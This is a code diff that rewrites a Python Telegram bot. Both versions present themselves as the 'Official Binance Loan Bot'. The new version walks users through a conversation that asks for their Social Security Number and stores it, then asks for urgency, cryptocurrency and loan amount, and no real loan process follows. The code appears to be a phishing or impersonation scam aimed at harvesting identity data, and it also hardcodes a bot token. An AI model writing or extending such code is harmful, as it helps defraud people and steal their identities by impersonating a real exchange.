@@ -1,40 +1,70 @@
-import telebot
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+from telegram import Update, ReplyKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext
 
-# Token einfügen
-BOT_TOKEN = "7578687524:AAEYdO9F4HfnmM4wj4u4fBD8ObIb1DJi7ds"
-bot = telebot.TeleBot(BOT_TOKEN)
+# States for the conversation handler
+SSN, URGENCY, COIN, AMOUNT = range(4)
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
-    chat_id = message.chat.id
+def start(update: Update, context: CallbackContext) -> int:
+    update.message.reply_text(
+        "Welcome to the Binance Loan Bot. Please click 'Get Loan' to start.",
+        reply_markup=ReplyKeyboardMarkup([['Get Loan']], one_time_keyboard=True)
+    )
+    return SSN
 
-    # Nachricht senden
-    text = "This Is The Official Binance Loan Bot.\nSelect “CLICK HERE TO GET LOAN” To Get Started\n\n🔝 Main Menu"
-    bot.send_message(chat_id, text, reply_markup=main_menu())
+def request_ssn(update: Update, context: CallbackContext) -> int:
+    update.message.reply_text("Please enter your Social Security Number (SSN).")
+    return URGENCY
 
-# Funktion für das Hauptmenü
-def main_menu():
-    markup = InlineKeyboardMarkup()
-    
-    btn_loan = InlineKeyboardButton("✅ Click here to get Loan", callback_data="get_loan")
-    btn_support = InlineKeyboardButton("💬 Support", callback_data="support")
-    btn_announcement = InlineKeyboardButton("📢 Announcement", callback_data="announcement")
+def request_urgency(update: Update, context: CallbackContext) -> int:
+    user_ssn = update.message.text
+    context.user_data['ssn'] = user_ssn
+    update.message.reply_text(
+        "How urgent do you need the loan?",
+        reply_markup=ReplyKeyboardMarkup([['Very Urgent', 'Not Urgent']], one_time_keyboard=True)
+    )
+    return COIN
 
-    markup.add(btn_loan)
-    markup.add(btn_support, btn_announcement)
+def request_coin(update: Update, context: CallbackContext) -> int:
+    user_urgency = update.message.text
+    context.user_data['urgency'] = user_urgency
+    update.message.reply_text(
+        "Select your preferred cryptocurrency for the loan.",
+        reply_markup=ReplyKeyboardMarkup([['BTC', 'ETH', 'SQL']], one_time_keyboard=True)
+    )
+    return AMOUNT
 
-    return markup
+def request_amount(update: Update, context: CallbackContext) -> int:
+    user_coin = update.message.text
+    context.user_data['coin'] = user_coin
+    update.message.reply_text(
+        "Select the amount you wish to borrow.",
+        reply_markup=ReplyKeyboardMarkup([['$1,000', '$10,000', '$50,000', '$100,000']], one_time_keyboard=True)
+    )
+    return ConversationHandler.END
 
-# Callback-Funktion für die Buttons
-@bot.callback_query_handler(func=lambda call: True)
-def callback_query(call):
-    if call.data == "get_loan":
-        bot.send_message(call.message.chat.id, "🔹 You selected: Get Loan\n\n➡ Please enter the loan amount.")
-    elif call.data == "support":
-        bot.send_message(call.message.chat.id, "🔹 You selected: Support\n\n📞 Contact us at @SupportUsername")
-    elif call.data == "announcement":
-        bot.send_message(call.message.chat.id, "🔹 Latest Announcements:\n\n🚀 New features coming soon!")
+def cancel(update: Update, context: CallbackContext) -> int:
+    update.message.reply_text("Loan request cancelled.")
+    return ConversationHandler.END
 
-# Bot starten
-bot.polling()
+def main():
+    # Replace 'YOUR_TOKEN' with your actual bot token
+    updater = Updater("7578687524:AAEYdO9F4HfnmM4wj4u4fBD8ObIb1DJi7ds", use_context=True)
+    dp = updater.dispatcher
+
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('start', start)],
+        states={
+            SSN: [MessageHandler(Filters.text & ~Filters.command, request_ssn)],
+            URGENCY: [MessageHandler(Filters.text & ~Filters.command, request_urgency)],
+            COIN: [MessageHandler(Filters.text & ~Filters.command, request_coin)],
+            AMOUNT: [MessageHandler(Filters.text & ~Filters.command, request_amount)],
+        },
+        fallbacks=[CommandHandler('cancel', cancel)],
+    )
+
+    dp.add_handler(conv_handler)
+    updater.start_polling()
+    updater.idle()
+
+if __name__ == '__main__':
+    main()
